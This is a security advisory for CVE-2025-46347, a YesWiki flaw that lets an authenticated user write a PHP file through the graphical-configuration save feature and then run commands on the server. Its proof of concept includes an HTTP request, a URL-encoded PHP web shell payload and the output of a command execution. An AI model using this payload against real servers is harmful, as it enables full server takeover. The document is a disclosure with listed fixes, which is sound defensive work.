# [H] YesWiki Remote Code Execution via Arbitrary PHP File Write and Execution

## Summary
Severity: High
Advisory: GHSA-88xg-v53p-fpvf
CVE: CVE-2025-46347
CWE: CWE-116
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-04-29
Source: https://github.com/advisories/GHSA-88xg-v53p-fpvf
Type: github-advisory

## Affected
- Packagist: `yeswiki/yeswiki` — affected >=0 <4.5.4

## Details
### Summary
An arbitrary file write can be used to write a file with a PHP extension, which then can be browsed to in order to execute arbitrary code on the server. 

All testing was performed on a local docker setup running the latest version of the application.

### PoC
Proof of Concept

Navigate to `http://localhost:8085/?LookWiki` which allows you to click `Create a new Graphical configuration` where you specify some parameters and then click `Save`. 

![LookWiki](https://github.com/user-attachments/assets/11c638ec-b700-483a-91fb-2d83107c2c69)


After clicking save, this request is made (most headers removed for clarity): 

```
POST /?api/templates/custom-presets/test.css HTTP/1.1
Host: localhost:8085

primary-color=%230c5d6a&secondary-color-1=%23d8604c&secondary-color-2=%23d78958&neutral-color=%234e5056&neutral-soft-color=%2357575c&neutral-light-color=%23f2f2f2&main-text-fontsize=17px&main-text-fontfamily=%22Nunito%22%2C+sans-serif&main-title-fontfamily='Nunito'%2C+sans-serif
```

This request writes the file `test.css` to disk with the contents (abbreviated)
```
:root {
  --primary-color: #0c5d6a;
  --secondary-color-1: #d8604c;
  --secondary-color-2: #d78958;
  --neutral-color: #4e5056;
  --neutral-soft-color: #57575c;
  --neutral-light-color: #f2f2f2;
  --main-text-fontsize: 17px;
  --main-text-fontfamily: "Nunito", sans-serif;
  --main-title-fontfamily: 'Nunito', sans-serif;
}
```

To exploit this, utilize a proxy tool to intercept the the first request and change the filename extension to `.php` and add arbitrary PHP code in for one of the request body parameters. 

e.g. `primary-color=%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E`

Now the file `pizzapower.php` is written to `/var/www/html/custom/css-presets/pizzapower.php` and it starts with this, where the PHP code is present. 


```
:root {
  --primary-color: <?php system($_GET['cmd']); ?>;
  --secondary-color-1: #d8604c;
  --secondary-color-2: #d78958;
  --neutral-color: #4e5056;
  --neutral-soft-color: #57575c;
  --neutral-light-color: #f2f2f2;
  --main-text-fontsize: 17px;
  --main-text-fontfamily: "Nunito", sans-serif;
  --main-title-fontfamily: 'Nunito', sans-serif;
}
```

Then, simply visit the file with a `cmd` parameter included. 

```
http://localhost:8085/custom/css-presets/pizzapower.php?cmd=id
```

And the HTTP response will contain the output of our command. Notably this request can be performed unauthenticated (the creation of the file requires auth, though). 

```
:root {
  --primary-color: uid=501(yeswiki) gid=501 groups=501
;
  --secondary-color-1: #d8604c;
  --secondary-color-2: #d78958;
  --neutral-color: #4e5056;
  --neutral-soft-color: #57575c;
  --neutral-light-color: #f2f2f2;
  --main-text-fontsize: 17px;
  --main-text-fontfamily: "Nunito", sans-serif;
  --main-title-fontfamily: 'Nunito', sans-serif;
}
```
![injection](https://github.com/user-attachments/assets/6567d500-23b9-4587-a166-3b49878446e7)

### Impact

Full compromise of the server. Can potentially be performed unwittingly by a user subjected to the previously reported (or future) XSS vulnerabilities. 

## Fixes

Amongst others: 

Restrict file extensions: Only allow a safelist of extensions (e.g., .css) when saving files via this feature.
Harden server config: Disable PHP execution in user-writable directories

## References
- https://github.com/YesWiki/yeswiki/security/advisories/GHSA-88xg-v53p-fpvf
- https://nvd.nist.gov/vuln/detail/CVE-2025-46347
- https://github.com/YesWiki/yeswiki/commit/8fe5275a78dc7e0f9c242baa3cbac6b5ac1cc066
- https://github.com/YesWiki/yeswiki
